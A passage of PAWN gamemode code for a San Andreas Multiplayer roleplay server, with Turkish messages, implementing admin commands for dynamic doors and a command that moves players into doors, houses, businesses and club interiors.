		if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		CreateDynamicDoor(doorid);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s, %d ID'li kapýnýn Pickupmodel'ini deðiþtirdi.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "delete", true) == 0)
	{
	    if(DDoorsInfo[doorid][ddDescription] == 0) {
	        format(string, sizeof(string), "%d ID'sine sahip bir kapý yok.", doorid);
			SendClientMessage(playerid, COLOR_WHITE, string);
			return 1;
	    }
    	//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
    	DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
	    DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		DDoorsInfo[doorid][ddDescription] = 0;
		DDoorsInfo[doorid][ddCustomInterior] = 0;
		DDoorsInfo[doorid][ddExteriorVW] = 0;
		DDoorsInfo[doorid][ddExteriorInt] = 0;
		DDoorsInfo[doorid][ddInteriorVW] = 0;
		DDoorsInfo[doorid][ddInteriorInt] = 0;
		DDoorsInfo[doorid][ddExteriorX] = 0;
		DDoorsInfo[doorid][ddExteriorY] = 0;
		DDoorsInfo[doorid][ddExteriorZ] = 0;
		DDoorsInfo[doorid][ddExteriorA] = 0;
		DDoorsInfo[doorid][ddInteriorX] = 0;
		DDoorsInfo[doorid][ddInteriorY] = 0;
		DDoorsInfo[doorid][ddInteriorZ] = 0;
		DDoorsInfo[doorid][ddInteriorA] = 0;
		DDoorsInfo[doorid][ddCustomExterior] = 0;
		DDoorsInfo[doorid][ddVIP] = 0;
		DDoorsInfo[doorid][ddGang] = 0;
		DDoorsInfo[doorid][ddFaction] = 0;
		DDoorsInfo[doorid][ddAdmin] = 0;
		DDoorsInfo[doorid][ddWanted] = 0;
		DDoorsInfo[doorid][ddVehicleAble] = 0;
		DDoorsInfo[doorid][ddColor] = 0;
		DDoorsInfo[doorid][ddPass] = 0;
		DDoorsInfo[doorid][ddLocked] = 0;
		DDoorsInfo[doorid][ddNotEditable] = 0;
		SaveDynamicDoors();
		format(string, sizeof(string), "%d ID'li kapýyý sildin.", doorid);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "%s, %d ID'li kapýyý sildi.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	return 1;
}

CMD:ddnext(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		SendClientMessage(playerid, COLOR_RED, "* Sýradaki kullanýlabilecek dinamik kapý listesi...");
		for(new x;x<MAX_DDOORS;x++)
		{
		    if(DDoorsInfo[x][ddDescription] == 0)
		    {
		        new string[128];
		        format(string, sizeof(string), "%d kullanýma müsait.", x);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        break;
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	return 1;
}

CMD:ddname(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}

	new string[128], doorid, doorname[128];

	if(sscanf(params, "ds[128]", doorid, doorname)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ddname [doorid] [name]");

	if(DDoorsInfo[doorid][ddNotEditable] == 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "Bu kapý Level 6 admin tarafýndan editlenemez hale getirildi, deðiþiklik yapmak için onlara ulaþýn.");
	    return 1;
	}

	format(DDoorsInfo[doorid][ddDescription], 128, "%s", doorname);
	SendClientMessage(playerid, COLOR_WHITE, "Kapýnýn ismini deðiþtirdiniz.");
	//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
	DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
	if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
	CreateDynamicDoor(doorid);
	SaveDynamicDoors();

	format(string, sizeof(string), "%s, %d ID'li kapýnýn ismini %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), doorid, doorname);
	Log("logs/ddedit.log", string);
	return 1;
}

CMD:lockdoor(playerid, params[])
{
    for(new i = 0; i < sizeof(DDoorsInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddExteriorVW] || IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddInteriorX], DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddInteriorVW]) {
        	if(DDoorsInfo[i][ddPass] < 1)
                return SendClientMessage(playerid, COLOR_GREY, "Bu kapýnýn kitlenmesi mümkün deðil.");
         	if(strcmp(DDoorsInfo[i][ddPass], "Yok", true) == 0)
                return SendClientMessage(playerid, COLOR_GREY, "Bu kapýnýn kitlenmesi mümkün deðil.");

			ShowPlayerDialogEx(playerid, DOORLOCK, DIALOG_STYLE_INPUT, "Kapý Güvenliði","Bu kapýnýn þifresini girin.","Giriþ","Iptal");
			SetPVarInt(playerid, "Door", i);
		}
	}
	return 1;
}

CMD:ddpass(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}

	new string[128],
		doorid,
		doorpass[24];

	if(sscanf(params, "ds[24]", doorid, doorpass)) { SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ddpass [doorid] [pass]"); SendClientMessage(playerid, COLOR_WHITE, "To remove the password on the door set the password to 'none' "); return 1; }


	if(DDoorsInfo[doorid][ddNotEditable] == 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "Bu kapý Level 6 admin tarafýndan editlenemez hale getirildi, deðiþiklik yapmak için onlara ulaþýn.");
	    return 1;
	}

	format(DDoorsInfo[doorid][ddPass], 24, "%s", doorpass);
	SendClientMessage(playerid, COLOR_WHITE, "Bu kapýnýn þifresini deðiþtirdin.");
	SaveDynamicDoors();
	format(string, sizeof(string), "%s, %d ID'li kapýnýn þifresini %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), doorid, doorpass);
	Log("logs/ddedit.log", string);
	return 1;
}

CMD:goindoor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new doornum;
		if(sscanf(params, "d", doornum)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /goindoor [kapinumarasi]");

		Streamer_UpdateEx(playerid, DDoorsInfo[doornum][ddInteriorX],DDoorsInfo[doornum][ddInteriorY],DDoorsInfo[doornum][ddInteriorZ]);
		SetPlayerInterior(playerid,DDoorsInfo[doornum][ddInteriorInt]);
		SetPlayerPos(playerid,DDoorsInfo[doornum][ddInteriorX],DDoorsInfo[doornum][ddInteriorY],DDoorsInfo[doornum][ddInteriorZ]);
		SetPlayerFacingAngle(playerid,DDoorsInfo[doornum][ddInteriorA]);
		if(DDoorsInfo[doornum][ddCustomInterior])
		{
			LoadObjectsForPlayer(playerid);
		}
		PlayerInfo[playerid][pInt] = DDoorsInfo[doornum][ddInteriorInt];
		PlayerInfo[playerid][pVW] = DDoorsInfo[doornum][ddInteriorVW];
		SetPlayerVirtualWorld(playerid, DDoorsInfo[doornum][ddInteriorVW]);
	}
	return 1;
}

CMD:gotodoor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new doornum;
		if(sscanf(params, "d", doornum)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /gotodoor [doornumber]");

		Streamer_UpdateEx(playerid, DDoorsInfo[doornum][ddExteriorX],DDoorsInfo[doornum][ddExteriorY],DDoorsInfo[doornum][ddExteriorZ]);
		if(DDoorsInfo[doornum][ddCustomExterior])
		{
			LoadObjectsForPlayer(playerid);
		}
		SetPlayerInterior(playerid,DDoorsInfo[doornum][ddExteriorInt]);
		SetPlayerPos(playerid,DDoorsInfo[doornum][ddExteriorX],DDoorsInfo[doornum][ddExteriorY],DDoorsInfo[doornum][ddExteriorZ]);
		SetPlayerFacingAngle(playerid,DDoorsInfo[doornum][ddExteriorA]);
		PlayerInfo[playerid][pInt] = DDoorsInfo[doornum][ddExteriorInt];
		SetPlayerVirtualWorld(playerid, DDoorsInfo[doornum][ddExteriorVW]);
		PlayerInfo[playerid][pVW] = DDoorsInfo[doornum][ddExteriorVW];
	}
	return 1;
}

CMD:gir(playerid, params[])
{
    if(GetPVarInt(playerid, "PBM") > 0) {
        SendClientMessage(playerid, COLOR_WHITE, "Arenadayken bunu yapamazsýn!");
        return 1;
    }
    if(PlayerCuffed[playerid] >= 1)
	{
        SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
        return 1;
    }
    if(PlayerInfo[playerid][pJailed] > 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
        return 1;
    }
	new string[128];
    for(new i = 0; i < sizeof(DDoorsInfo); i++)
	{
        if(IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddExteriorVW])
		{
            if(DDoorsInfo[i][ddVIP] > 0 && PlayerInfo[playerid][pDonator] < DDoorsInfo[i][ddVIP]) {
                SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Yeterli VIP leveline sahip deðilsin.");
                return 1;
            }

            if(DDoorsInfo[i][ddGang] > 0) {
                if(PlayerInfo[playerid][pGang] != DDoorsInfo[i][ddGang]) {
                    SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Bu kapý bir çete/aileye özeldir.");
                    return 1;
                }
            }

            if(DDoorsInfo[i][ddFaction] > 0 && DDoorsInfo[i][ddFaction] != 1337) {
				if(PlayerInfo[playerid][pFaction] != DDoorsInfo[i][ddFaction])
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Bu kapý oluþumlara özeldir.");
					return 1;
				}
            }

			if(DDoorsInfo[i][ddFaction] == 1337) {
				if(!IsACop(playerid) || PlayerInfo[playerid][pFaction] != 5)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Bu kapý oluþumlara özeldir.");
					return 1;
				}
            }

            if(DDoorsInfo[i][ddAdmin] > 0 && PlayerInfo[playerid][pAdmin] < DDoorsInfo[i][ddAdmin]) {
                SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri girmek için yeterli admin leveline sahip deðilsin.");
                return 1;
            }

            if(DDoorsInfo[i][ddWanted] > 0 && PlayerInfo[playerid][pWantedLevel] != 0) {
                SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin, bu kapý arananlar listesindekiler için yasaklý.");
                return 1;
            }

			if(DDoorsInfo[i][ddLocked] == 1) {
			    return SendClientMessage(playerid, COLOR_GRAD2, "Bu kapý þuanda kitli.");
			}

			format(string, sizeof(string), "* %s, %s adlý yere girdi.", GetPlayerNameEx(playerid), DDoorsInfo[i][ddDescription]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerInterior(playerid,DDoorsInfo[i][ddInteriorInt]);
            PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddInteriorInt];
            PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddInteriorVW];
            SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddInteriorVW]);
            if(DDoorsInfo[i][ddCustomInterior]) {
                LoadObjectsForPlayer(playerid);
            }
            if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorA]);
                SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorVW]);
                LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorInt]);
            }
            else {
                SetPlayerPos(playerid,DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                SetPlayerFacingAngle(playerid,DDoorsInfo[i][ddInteriorA]);
                SetCameraBehindPlayer(playerid);
            }
			foreach(Player, x)
			{
                if(IsABoomboxNearby(DDoorsInfo[i][ddInteriorX] ,DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ], x) < 150.0 && DDoorsInfo[i][ddInteriorVW] == BoomboxInfo[x][bbVW] && DDoorsInfo[i][ddInteriorInt] == BoomboxInfo[x][bbInt])
				{
					PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
				}
			}
            return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
        }
    }
    for(new i = 0; i < sizeof(HouseInfo); i++)
	{
        if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
		{
            if(HouseKey[playerid] == i || PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i || HouseInfo[i][hLock] == 0 || PlayerInfo[playerid][pRenting] == i || strcmp(HouseInfo[i][hOwner], PlayerInfo[playerid][pMarriedTo],true) == 0)
			{
			    if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i)
			    {
					format(string, sizeof(string), "* %s kendi evine girdi.", GetPlayerNameEx(playerid));
					ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			    }
			    else
			    {
					if(HouseInfo[i][hOwned] == 0) {
						format(string, sizeof(string), "* %s evin içine girdi.", GetPlayerNameEx(playerid));
						ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					} else {
						format(string, sizeof(string), "* %s, %s adlý kiþinin evine girdi.", GetPlayerNameEx(playerid), HouseInfo[i][hOwner]);
						ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
				}

                SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
                PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
                PlayerInfo[playerid][pVW] = i+60000;
                SetPlayerVirtualWorld(playerid, i+60000);
                if(HouseInfo[i][hCustomInterior] == 1)
				{
                    LoadObjectsForPlayer(playerid);
                }
                SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
                SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorR]);
                SetCameraBehindPlayer(playerid);
                if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i)
                {
                	GameTextForPlayer(playerid, "~w~Eve Hosgeldin", 5000, 1);
			 	}
 				foreach(Player, x)
				{
                	if(IsABoomboxNearby(HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ], x) < 150.0 && i+60000 == BoomboxInfo[x][bbVW] && HouseInfo[i][hHInteriorWorld] == BoomboxInfo[x][bbInt])
					{
						PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
					}
				}
				Streamer_UpdateEx(playerid, HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
            }
            else
			{
                GameTextForPlayer(playerid, "~r~Kitli", 5000, 1);
            }
            return 1;
        }
    }
    for(new idx=1; idx<MAX_BIZ; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
		{
		    if(!BizInfo[idx][bStatus] && PlayerInfo[playerid][pBiz] != idx) return SendClientMessage(playerid, COLOR_GREY, "Bu iþyeri kilitli.");
		    if(BizInfo[idx][bType] == 1) // 24/7 Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, -27.3025,-57.6649,1003.5469);
		        SetPlayerFacingAngle(playerid, 357.5915);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 6);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "* %s'ýn 24/7 Marketine hoþ geldiniz. (( /satinal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 2) // Clothes Shop Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 207.0638,-139.9965,1003.5078);
		        SetPlayerFacingAngle(playerid, 356.3849);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 3);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "**  %s 'ýn Giysi Maðazasýna Hoþ Geldin (( /kiyafetal & /aksesuaral )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
		        GameTextForPlayer(playerid, "~w~Objeler Yukleniyor", 3500, 3);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 3) // Ammunation Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 285.8044,-85.9956,1001.5229);
		        SetPlayerFacingAngle(playerid, 358.9898);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 4);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'in Silahçý Dükkanýna hoþgeldiniz (( /satinal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 4) // Club Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 493.4252,-24.3061,1000.6797);
		        SetPlayerFacingAngle(playerid, 0.2432);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 17);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'in Club'ýna hoþ geldiniz (( /yemekal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 5) // Advertisement Agency
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 384.808624,173.804992,1008.382812);
		        SetPlayerFacingAngle(playerid, 86.7239);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 3);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'nýn Reklamcýlýk Þirketin Hoþgeldin (( /reklamver )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 6) // Fast Food
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 372.3830,-133.2579,1001.4922);
		        SetPlayerFacingAngle(playerid, 0.4216);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 5);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'nýn Fast Food'una Hoþgeldin (( /yemekal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 7) //Tv
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 1003.9112,52.2134,55.3221);
		        SetPlayerFacingAngle(playerid, 0.4216);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 0);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'nýn Elektronik Maðazasý'na Hoþgeldin (( /satinal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
				return 1;
		    }
		}
	}
    // Hitman HQ
    if(IsPlayerInRangeOfPoint(playerid, 2.0,  1938.545898, 165.629531, 37.281250))
	{
        if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
            SetPlayerVirtualWorld(playerid, 666420);
            PlayerInfo[playerid][pVW] = 666420;
            SetPlayerInterior(playerid, 42);
            PlayerInfo[playerid][pInt] = 42;
            SetPlayerPos(playerid, 1277.019165, -758.428771, 5080.750000);
            SetPlayerFacingAngle(playerid, 358.16);
            SetCameraBehindPlayer(playerid);

    		LoadObjectsForPlayer(playerid);
   			SendClientMessage(playerid, COLOR_WHITE, "Cephanelik odasýnda silah almak için /siparis");
        }
    }

    // The Lubu Gentlemen's Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  511.817230, -1510.971679, 14.566996))
	{
		format(string, sizeof(string), "* %s, Scylla Bar'a girdi.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

 		SetPlayerVirtualWorld(playerid, 373737);
   		PlayerInfo[playerid][pVW] = 373737;
     	SetPlayerInterior(playerid, 37);
      	PlayerInfo[playerid][pInt] = 37;
       	SetPlayerPos(playerid, -1077.946533, 613.206665, 1116.507812);
        SetPlayerFacingAngle(playerid, 92.42);
        SetCameraBehindPlayer(playerid);

		LoadObjectsForPlayer(playerid);

		PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=242774", -1087.677978, 615.239807, 1116.507812, 40.0, 1);
    }

    // The Tableau Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  561.802795, -1506.722412, 14.548986))
	{
		format(string, sizeof(string), "* %s, Scylla Kulübüne girdi.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

 		SetPlayerVirtualWorld(playerid, 363636);
   		PlayerInfo[playerid][pVW] = 363636;
     	SetPlayerInterior(playerid, 36);
      	PlayerInfo[playerid][pInt] = 36;
       	SetPlayerPos(playerid, 308.045654, 1053.886840, 1098.540039);
        SetPlayerFacingAngle(playerid, 267.57);
        SetCameraBehindPlayer(playerid);

		LoadObjectsForPlayer(playerid);

		PlayAudioStreamForPlayer(playerid, "http://188.132.234.206:8000/listen.pls", 321.139465, 1034.947753, 1098.914062, 120.0, 1);
    }

    // The Tableau Club (VIP ROOM)
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  307.904296, 1025.602294, 1098.540039))
	{
	    if(GetPlayerCash(playerid) >= 100)
	    {
			format(string, sizeof(string), "* %s, Scylla Kulübü VIP odasýna girdi.", GetPlayerNameEx(playerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			GivePlayerCash(playerid, -100);
			GameTextForPlayer(playerid, "~r~-$100", 3000, 1);

 			SetPlayerVirtualWorld(playerid, 363636);
   			PlayerInfo[playerid][pVW] = 363636;
     		SetPlayerInterior(playerid, 36);
      		PlayerInfo[playerid][pInt] = 36;
       		SetPlayerPos(playerid, 293.066436, 1029.785278, 1104.560058);
        	SetPlayerFacingAngle(playerid, 352.47);
        	SetCameraBehindPlayer(playerid);
		 }
		 else
		 {
		    SendClientMessage(playerid, COLOR_GREY, " You do not have the cash for that.");
		 }
    }

    // Santa Maria Surfer's Lounge
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  387.958374, -1870.688110, 7.835937))
	{
		format(string, sizeof(string), "* %s, Santa Maria Sörfçülerin Yeri'ne girdi.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

 		SetPlayerVirtualWorld(playerid, 353535);
   		PlayerInfo[playerid][pVW] = 353535;
     	SetPlayerInterior(playerid, 35);
      	PlayerInfo[playerid][pInt] = 35;
       	SetPlayerPos(playerid, 271.742034, 1074.419677, 5096.750000);
        SetPlayerFacingAngle(playerid, 86.54);
        SetCameraBehindPlayer(playerid);

		LoadObjectsForPlayer(playerid);

		PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=21585", 271.742034, 1074.419677, 5096.750000, 120.0, 1);
    }

	new vehicleid = GetPlayerVehicleID(playerid);
	new closestcar = GetClosestCar(playerid, vehicleid);
	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && GetVehicleModel(closestcar) == 519)
	{
	    if(VehicleStatus{closestcar} == 1) return SendClientMessage(playerid, COLOR_WHITE, "Uçak hasar gördüðünden dolayý binemezsin.");
   		format(string, sizeof(string), "* %s adlý kiþi Shamal model uçaða yolcu olarak bindi.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
     	SetPlayerPos(playerid, 2.509036, 23.118730, 1199.593750);
     	SetPlayerFacingAngle(playerid, 82.14);
        SetCameraBehindPlayer(playerid);
		PlayerInfo[playerid][pVW] = closestcar;
		SetPlayerVirtualWorld(playerid, closestcar);
		PlayerInfo[playerid][pInt] = 1;
        SetPlayerInterior(playerid, 1);
		InsideShamal[playerid] = closestcar;
		SendClientMessage(playerid, COLOR_WHITE, "Uçaðýn kapýsýndan dýþarý çýkmak için /cik yaz. /camdanbak komutu ile dýþarý bakabilirsin.");

		foreach(Player, x)
		{
 			if(IsABoomboxNearby(2.509036, 23.118730, 1199.593750, x) < 150.0 && closestcar == BoomboxInfo[x][bbVW] && BoomboxInfo[x][bbInt] == 1)
			{
